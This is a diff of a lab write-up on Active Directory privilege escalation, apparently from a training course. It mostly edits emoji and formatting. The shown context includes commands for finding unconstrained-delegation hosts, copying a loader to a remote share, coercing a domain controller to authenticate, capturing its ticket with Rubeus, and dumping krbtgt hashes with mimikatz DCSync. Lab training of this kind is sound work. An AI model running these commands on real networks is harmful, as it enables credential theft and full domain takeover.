@@ -1,4 +1,4 @@
-# Learning Objective 15 (Domain Privilege Escalation | Unconstrained Delegation + Coercion + DCSync)
+# Learning Objective 15 (Domain Privilege Escalation | Unconstrained Delegation Abuse + Coercion + DCSync)
 
 ## Tasks
 
@@ -40,7 +40,7 @@
 `Get-DomainComputer -Unconstrained | select -ExpandProperty name`:
 ```
 DCORP-DC
-DCORP-APPSRV📌
+DCORP-APPSRV🖥️
 ```
 
 - **Access to the Target Server with a User that has Local Admin Privileges on it**
@@ -108,7 +108,7 @@ Current LogonId is 0:0x2493b32
 
 Cached Tickets: (1)
 
-#0>     Client: appadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL
+#0>     Client: appadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
         Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
@@ -129,31 +129,11 @@ Cached Tickets: (1)
 
 `Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local`:
 ```
-dcorp-appsrv📌
+dcorp-appsrv🖥️
 dcorp-adminsrv
 ```
 
 Sweet! We have admin access to the machine that has unconstrained delegation.
-
-![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
-
-`klist`:
-```
-Current LogonId is 0:0x2493b32
-
-Cached Tickets: (1)
-
-#0>     Client: appadmin🎭 @ DOLLARCORP.MONEYCORP.LOCAL🏛️
-        Server: krbtgt📌/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
-        Start Time: 2/16/2025 7:53:18 (local)
-        End Time:   2/16/2025 17:53:18 (local)
-        Renew Time: 2/23/2025 7:53:18 (local)
-        Session Key Type: AES-256-CTS-HMAC-SHA1-96
-        Cache Flags: 0x1 -> PRIMARY
-        Kdc Called:
-```
 
 `echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y`:
 ```
@@ -226,6 +206,8 @@ RpcRemoteFindFirstPrinterChangeNotificationEx failed.Error Code 1722 - The RPC s
 ```
 
 On the Rubeus listener, we can see the TGT of `dcorp-dc$`.
+
+![dcorp-appsrv | appadmin](https://custom-icon-badges.demolab.com/badge/dcorp--appsrv-appadmin-64b5f6?logo=windows11&logoColor=white)
 
 ```
 [...]
@@ -327,7 +309,7 @@ Now, we can run DCSync from this process.
 [SNIP]
 
 mimikatz(commandline) # lsadump::evasive-dcsync /user:dcorp\krbtgt📌
-[DC] 'dollarcorp.moneycorp.local' will be the domain
+[DC] 'dollarcorp.moneycorp.local'🏛️ will be the domain
 [DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
 [DC] 'dcorp\krbtgt' will be the user account
 [rpc] Service  : ldap
@@ -571,7 +553,7 @@ Now, we can run DCSync from this process.
 [SNIP]
 
 mimikatz(commandline) # lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local📌
-[DC] 'moneycorp.local' will be the domain
+[DC] 'moneycorp.local'🏛️ will be the domain
 [DC] 'mcorp-dc.moneycorp.local' will be the DC server
 [DC] 'mcorp\krbtgt' will be the user account
 [rpc] Service  : ldap
